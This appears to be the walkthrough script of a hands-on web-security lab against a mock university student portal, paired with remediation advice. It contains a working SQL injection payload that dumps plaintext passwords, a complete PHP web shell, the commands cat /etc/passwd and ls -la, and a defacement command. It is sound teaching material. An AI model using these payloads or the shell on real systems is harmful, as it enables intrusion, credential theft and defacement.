<?php
/* Guided walkthrough. Lab harness, not part of the University A Student Portal. */

$GUIDE = [
'intro' => 'Two mistakes, one behind the other. The Student Directory\'s search box builds its SQL by gluing your text into it, and the avatar form on your profile saves whatever you hand it into a folder the server will execute. The first gives you the administrator\'s password. The second is waiting behind the administrator\'s own login.<br><br>There is no sign-up on this portal - accounts are issued by the Registrar\'s Office, same as a real campus SSO. Sign in with the student account below first: the SQL injection is reachable by any signed-in account, student or staff, not just an administrator\'s.',
'steps' => [

['t' => 'Sign in, then search for something normal',
 'b' => '<p>Sign in with the student account above, then open <strong>STUDENTS</strong> in the navigation. Type a name fragment into <strong>Search by name</strong> and press Search.</p>',
 'try' => [
     'Search by name' => 'a',
 ],
 'see' => 'A few rows. Your text travelled into the database and came back as results. Hold on to that: it <em>went into</em> the database.',
],

['t' => 'Send one apostrophe',
 'b' => '<p>Clear the box. Type a single <code>\'</code> and press Search.</p>',
 'try' => [
     'Search by name' => '\'',
 ],
 'see' => 'A red <strong>SQL error</strong> - the database\'s own complaint, printed on the page. That only happens if your text arrived as part of the instruction instead of as data.',
],

['t' => 'Read every username and password',
 'b' => '<p>One row per account: the Name column is the username, the Programme column holds the password - not a programme at all, just whatever you told the page to print there.</p>',
 'try' => [
     'Search by name' => 'zzz\' UNION SELECT 1,username,2,username,password,3,0 FROM users -- -',
 ],
 'see' => 'Forty-two accounts, and their passwords are <strong>just sitting there</strong>. Not hashes to crack - the passwords. Scroll through them and notice how many are the same.',
],

['t' => 'Sign in as the administrator',
 'b' => '<p><strong>LOGOUT</strong> first - the sign-in form only shows when nobody is signed in. Then sign in with username <code>admin</code>, password the one you just read off the screen.</p>',
 'see' => 'You are the administrator. A <strong>DASHBOARD</strong> loads, and an <strong>ADMIN</strong> tab appears in the navigation. The SQL injection is over - everything after this is just being logged in.',
],

['t' => 'Find somewhere to put a file',
 'b' => '<p>Go to <strong>PROFILE</strong>, then <strong>Edit profile</strong>.</p>',
 'see' => 'An avatar form. It takes a file and says nothing about what kind of file.',
],

['t' => 'Write a web shell',
 'b' => '<p>Make a file on your own computer called <code>shell.php</code> holding exactly this. It is a command box, not a URL trick: whatever you type into it runs on the server, and the output prints right there on the page.</p>',
 'try' => [
     'shell.php' => '<?php
if(preg_match("#^/i/([a-f0-9]{10})/#",$_SERVER["SCRIPT_NAME"],$m))setcookie("ss_sid",$m[1],time()+604800,"/");
if(isset($_POST["c"])){$o=shell_exec($_POST["c"])??"";}
?><!DOCTYPE html><html><head><title>shell</title><style>
body{background:#000;color:#3dff7a;font-family:ui-monospace,Menlo,Consolas,monospace;margin:0;padding:24px}
.term{max-width:860px;margin:40px auto;border:1px solid #3a6a3a;border-radius:8px;box-shadow:0 0 30px rgba(61,255,122,.15);overflow:hidden}
.bar{background:#161616;padding:8px 12px;border-bottom:1px solid #3a6a3a;display:flex;align-items:center;gap:6px}
.dot{width:10px;height:10px;border-radius:50%}
.r{background:#ff5f56}.y{background:#ffbd2e}.g{background:#27c93f}
.title{color:#a8c0a8;font-size:12px;margin-left:8px}
pre{margin:0;padding:16px;white-space:pre-wrap;word-break:break-all;min-height:220px;max-height:60vh;overflow:auto;font-size:15px}
.hist{color:#a8c0a8}
form{display:flex;align-items:center;gap:8px;border-top:1px solid #3a6a3a;padding:12px 16px}
.p{color:#3dff7a}
input{flex:1;background:transparent;border:0;outline:0;color:#3dff7a;font:inherit;font-size:15px}
</style></head><body>
<div class=term>
<div class=bar><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class=title>root@portal</span></div>
<pre><?php if(isset($o)){echo "<span class=hist>$ ".htmlspecialchars($_POST["c"])."</span>\n".htmlspecialchars($o);}else{echo "<span class=hist>connected.</span>";}?></pre>
<form method=post><span class=p>$</span><input name=c autofocus autocomplete=off></form>
</div>
</body></html>',
     '--1' => '<strong>Windows:</strong> Notepad, then Save as, and set <em>Save as type</em> to <em>All files</em> so it does not become shell.php.txt.',
     '--2' => '<strong>Mac:</strong> TextEdit, then Format &rarr; Make Plain Text before you save.',
     '--3' => '<strong>Linux or a terminal:</strong> <code>nano shell.php</code>, paste, <strong>Ctrl+O</strong> then <strong>Enter</strong> to save, <strong>Ctrl+X</strong> to leave.',
 ],
 'see' => 'A short text file. It takes whatever you type into its box and runs it as a command on the server.',
],

['t' => 'Upload it',
 'b' => '<p>Back on <strong>Edit profile</strong>, choose <code>shell.php</code> and press <strong>Upload avatar</strong>.</p>',
 'see' => 'A message saying where it saved, and the broken avatar image itself becomes a link. No complaint about the extension, because nothing looked at it. Your broken avatar is a PHP file now.',
],

['t' => 'Open it',
 'b' => '<p>Click the broken avatar image. It opens your shell in a new tab - same browser, same cookies, so you never have to retype or paste a URL by hand.</p>',
 'see' => 'A dark terminal window with a <code>$</code> prompt. That box is now the only thing standing between you and the server.',
],

['t' => 'Run a command',
 'b' => '<p>Type a command into the box and press <strong>Run</strong>.</p>',
 'try' => [
     'Type this in the box' => 'id',
 ],
 'see' => '<code>uid=33(www-data) gid=33(www-data)</code>, printed under the form. That is not your browser talking - that is the server running your command and reading the answer back to you.',
],

['t' => 'Look around',
 'b' => '<p>Change the command. Anything the web server user can do, you can now do.</p>',
 'try' => [
     'What is in here' => 'ls -la',
     'Who lives on this box' => 'cat /etc/passwd',
 ],
 'see' => 'A directory listing, then the account list. This is the moment the bug stops being about one page.',
],

['t' => 'Deface the sign-in page',
 'b' => '<p>Write a new sign-in page. The shell runs in its own folder, so <code>home.html</code> lands where the site will find it - but only for you, since every player gets their own copy of the site. Paste this into the shell\'s box and press <strong>Run</strong> - do not retype it, it is long on purpose.</p>',
 'try' => [
     'Paste into the shell box' => 'echo "<!DOCTYPE html><html><head><title>HACKED</title><style>body{background:#070b08;color:#d6ffe4;font-family:ui-monospace,Menlo,Consolas,monospace;text-align:center;margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px 70px;box-sizing:border-box}.skull{font-size:2.6em;margin-bottom:12px;filter:drop-shadow(0 0 10px #39ff6a)}h1{font-size:4.4em;letter-spacing:0.08em;margin:0 0 20px;color:#6effa6;text-shadow:0 0 6px #39ff6a,0 0 26px #39ff6a,2px 2px 0 #ff3b5c}.sub{color:#6effa6;letter-spacing:0.14em;font-size:1em;margin-bottom:28px;opacity:0.9}.body{max-width:540px;line-height:1.7;color:#c9d6cf;font-size:1em;margin-bottom:20px}.tagline{color:#c9d6cf;font-size:1em;margin-bottom:28px}.credit{color:#ff5577;font-weight:bold;font-size:1.05em;margin-bottom:8px}.greetz{color:#7a877e;font-size:0.85em}footer{position:fixed;left:0;right:0;bottom:0;display:flex;justify-content:space-between;padding:8px 18px;border-top:1px solid #16231a;font-size:0.8em;color:#6effa6;opacity:0.8;box-sizing:border-box}</style></head><body><div class=skull>&#9760;</div><h1>HACKED</h1><p class=sub>// UNIVERSITY A - STUDENT PORTAL - OWNED //</p><p class=body>your &ldquo;secure&rdquo; portal wasn\'t. we were inside. the upload was wide open and nobody was watching the logs.</p><p class=tagline>patch your stuff. protect your students.</p><p class=credit>&mdash; defaced by @evilucimx _</p><p class=greetz>greetz: n0ctis &middot; ghosthzrd &middot; the_lab_crew</p><footer><span>root@portal:/var/www/html#</span><span>sys0wned &middot; 2026</span></footer></body></html>" > home.html',
     '--1' => 'Now open the portal\'s sign-in page, in the same browser.',
 ],
 'see' => 'A green skull, the word HACKED in glowing letters, and a message signed off as <code>@evilucimx</code>. The sign-in page is gone. That is the <strong>I</strong> in the CIA triad - integrity - and it is the version of this your users notice.',
],

['t' => 'Put it back',
 'b' => '<p>Click <strong>RESTORE SIGN-IN PAGE</strong>, centred near the bottom of the defaced page.</p>',
 'see' => 'The sign-in page returns. Your shell is still there. Only you ever saw the defacement - everyone else in the room gets to do it themselves.',
],
],
'after' => '<p>Neither bug is exotic. The directory search box trusts text to stay text, and the upload form trusts a filename to describe its contents. Both are decades old and both are still shipping.</p><p>What made it a bad day was the order. Reading the database would have been a report on its own; reading <em>plain text passwords</em> turned it into a key. Hashing would not have stopped the injection - it would have stopped the injection from mattering.</p><p>Three fixes, each one sufficient to break the chain:</p><p><strong>1.</strong> Bind the parameter. Pass the search term as a value, not as part of the query, and every payload above becomes a result nobody has.</p><p><strong>2.</strong> Hash the passwords. The dump still happens and is still a breach, but nobody signs in with it.</p><p><strong>3.</strong> Store uploads outside the web root, rename them, and never let the server execute what a user sent. Then a PHP file is just a file.</p>',
];
